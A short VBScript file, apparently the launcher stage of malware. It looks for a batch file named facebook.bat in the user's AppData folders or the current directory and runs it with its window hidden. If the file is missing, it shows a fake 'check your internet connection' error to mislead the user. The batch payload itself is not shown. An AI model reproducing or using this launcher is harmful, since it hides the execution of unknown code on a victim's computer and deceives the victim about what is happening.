Dim FSO
Set WshShell = CreateObject( "WScript.Shell" )
Set FSO = CreateObject("Scripting.FileSystemObject")


User = WshShell.ExpandEnvironmentStrings( "%USERNAME%" )
Loc1 = "C:\Users\"+ User + "\AppData\Roaming\facebook.bat"
Loc2 = "C:\Users\"+ User + "\AppData\Local\0101\facebook.bat"
Loc3 = ".\facebook.bat"
Currnt = "C:\Users\"+ User + "\AppData\Roaming"

If fso.FileExists(Loc1) Then
   WshShell.CurrentDirectory=Currnt 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Roaming\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc2) Then
   WshShell.CurrentDirectory=Currnt 
   WshShell.Run chr(34) & "C:\Users\"+ User + "\AppData\Local\0101\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Elseif fso.FileExists(Loc3) Then
   WshShell.Run chr(34) & ".\facebook.bat" & Chr(34), 0
   Set WshShell = Nothing 

Else
   MsgBox "Please check your internet connection and try again!"

End If






